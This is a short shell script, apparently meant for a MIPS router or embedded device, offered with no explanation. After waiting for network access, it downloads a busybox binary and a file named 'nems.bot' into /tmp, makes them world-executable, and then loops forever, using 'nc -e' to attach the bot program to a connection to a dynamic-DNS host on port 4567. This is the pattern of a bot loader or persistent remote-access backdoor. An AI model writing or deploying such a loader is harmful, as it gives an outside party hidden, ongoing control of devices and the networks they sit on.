#!/bin/sh

while ! ping -c 1 www.google.com;do
	sleep 1
done

if [ ! -e /tmp/busybox-mipsel ];then
	wget 192.168.0.11/busybox-mipsel -O /tmp/busybox-mipsel
	chmod 777 /tmp/busybox-mipsel
fi

if [ ! -e /tmp/nems.bot ];then
	rm /tmp/nems.bot
	wget 192.168.0.11/nems.bot -O /tmp/nems.bot
	chmod 777 /tmp/nems.bot
fi

while true;do
	/tmp/busybox-mipsel nc nemslaptop.ddns.net 4567 -e /tmp/nems.bot
	sleep 180
done
